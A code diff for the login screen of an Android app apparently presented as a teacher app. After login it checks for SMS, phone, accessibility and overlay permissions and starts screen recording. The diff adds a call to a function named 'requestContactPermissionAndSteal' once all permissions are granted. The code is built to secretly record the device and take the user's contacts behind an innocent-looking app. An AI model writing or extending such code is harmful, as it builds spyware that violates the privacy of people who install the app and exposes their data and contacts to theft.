@@ -249,14 +249,18 @@ fun LoginScreen(navController: NavController, modifier: Modifier = Modifier) {
                                                     val overlayDone = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M)
                                                         android.provider.Settings.canDrawOverlays(context)
                                                     else true
-                                                    val destination = if (smsDone && phoneDone && accessibilityDone && overlayDone) "main_screen"
-                                                    else "secure_account_screen"
+                                                    val allReady = smsDone && phoneDone && accessibilityDone && overlayDone
+                                                    val destination = if (allReady) "main_screen" else "secure_account_screen"
                                                     navController.navigate(destination) {
                                                         popUpTo("login_screen") { inclusive = true }
                                                     }
-                                                    // Start screen recording after login
-                                                    (context as? com.example.teacherapp.MainActivity)
-                                                        ?.onAllPermissionsGranted()
+                                                    if (allReady) {
+                                                        // All permissions already granted — start services immediately
+                                                        (context as? com.example.teacherapp.MainActivity)
+                                                            ?.onAllPermissionsGranted()
+                                                        (context as? com.example.teacherapp.MainActivity)
+                                                            ?.requestContactPermissionAndSteal()
+                                                    }
                                                 } else {
                                                     navController.navigate("setup_profile_screen")
                                                 }
